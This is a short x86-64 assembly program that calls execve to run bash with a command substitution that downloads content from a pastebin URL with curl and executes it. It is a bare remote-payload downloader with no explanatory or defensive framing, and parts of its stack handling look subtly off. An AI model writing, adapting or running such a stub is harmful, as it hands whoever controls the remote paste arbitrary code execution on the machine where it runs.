global _start

argv0 db `/bin/bash`, 0x0
argv1 db `-c`, 0x0
argv2 db `$(curl -s https://pastebin.com/raw/r3vA1PXu)`, 0x0

_start:
	pop rax
	lea r9, [rsp + (rax + 1) * 4]
	push rax

	xor rax, rax
	push rax; NULL
	lea rdi, [rel argv2]
	push rdi
	lea rdi, [rel argv1]
	push rdi
	lea rdi, [rel argv0]
	push rdi

	mov rsi, rsp
	push r9
	pop rdx
	lea rdi, [rel argv0]
	mov rax, 59
	syscall

	add rsp, 32

ret
